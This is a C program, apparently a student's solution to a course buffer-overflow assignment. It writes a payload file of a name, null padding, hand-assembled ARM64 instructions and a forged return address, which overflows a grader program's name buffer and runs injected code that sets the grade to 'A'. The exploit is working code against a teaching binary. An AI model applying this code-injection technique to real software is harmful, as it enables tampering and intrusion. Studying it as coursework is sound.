#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "miniassembler.h"

int main(void)
{
     /* Variable to hold index. */
    int i;

    /* Variable to hold name to be
       input into grader program. */
    const char* name = "Tansha Vugarwal";

    /* Address of assembly instructions in BSS section
       (within name array) to branch back to (address of name[0] + 32). */
    unsigned long ulReturnAddress = 0x420078;

    /* mov  w0, A */
    unsigned int uiMovInstr = MiniAssembler_mov(0, 0x41);

    /*    0: Name of 32-bit register. 
       0x41: A in hexadecimal. */

    /* adr  x1, grade */
    unsigned int uiAdrInstr = MiniAssembler_adr(1, 0x420044, 0x42007C);

    /*        1: Name of 64-bit register to be stored to. 
       0x420044: Address of grade in the Data section.
       0x42007C: Starting address of this instruction in
                 BSS section (address of name[0] + 36). */

    /* strb w0, [x1] */
    unsigned int uiStrbInstr = MiniAssembler_strb(0, 1);

    /* 0: Name of 32-bit source register, containing A. 
       1: Name of 64-bit destination register containing
          address of grade. */

    /* b    call of printf in main. */
    /* Branch to printf("%c is your grade.\n", grade); */
    unsigned int uiBInstr = MiniAssembler_b(0x400864, 0x420084);

    /* 0x400864: Address of printf instruction in text section.
       0x420084: Starting address of this instruction in
                 BSS section (address of name[0] + 44). */

    /* File to be written to. */
    FILE *psFile;
    psFile = fopen("dataA", "w");

    /* Printing out hardcoded name from name[0] - name[14]. */
    fprintf(psFile, "%s", name);

    /* Printing null-terminating character 17
       times, to fill up the char array name,
       from name[15] - name[31]. */
    for (i = 0; i < 17; i++)
    {
        putc('\0', psFile); /* Writes 00000000 */
    }

    /* Print mov  w0, A from name[32] - name[35]. */
    fwrite(&uiMovInstr, sizeof(unsigned int), 1, psFile);

    /* Print adr  x1, grade from name[36] - name[39]. */
    fwrite(&uiAdrInstr, sizeof(unsigned int), 1, psFile);

    /* Print strb w0, [x1] from name[40] - name[43]. */
    fwrite(&uiStrbInstr, sizeof(unsigned int), 1, psFile);

    /* Print b   printf from name[44] - name[47]. */
    fwrite(&uiBInstr, sizeof(unsigned int), 1, psFile);

    /* Replace x30 for getName() which is supposed to branch
       back to main at the 'if (strcmp(name, "Andrew Appel") != 0)'
       instruction with the address of assembly instructions in 
       BSS section within name array (address of name[0] + 32). */
    fwrite(&ulReturnAddress, sizeof(unsigned long), 1, psFile);

    fclose(psFile);

    /* Return success. */
    return EXIT_SUCCESS; 
}

